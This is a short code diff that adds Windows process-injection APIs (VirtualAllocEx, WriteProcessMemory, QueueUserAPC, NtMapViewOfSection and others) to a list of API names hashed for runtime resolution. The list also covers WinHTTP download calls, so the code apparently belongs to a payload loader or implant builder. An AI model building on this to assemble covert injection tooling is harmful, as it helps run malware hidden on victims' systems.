@@ -32,7 +32,10 @@ def _get_api_hashes():
         "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
         "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
         "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders",
-        "RtlZeroMemory", "FindResourceA", "LoadResource", "LockResource", "SizeofResource"
+        "RtlZeroMemory", "FindResourceA", "LoadResource", "LockResource", "SizeofResource",
+        "CreateProcessA", "VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC", "ResumeThread",
+        "lstrlenA", "GetEnvironmentVariableA", "VirtualProtectEx", "GetLastError",
+        "NtCreateSection", "NtMapViewOfSection"
     ]
     module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
     
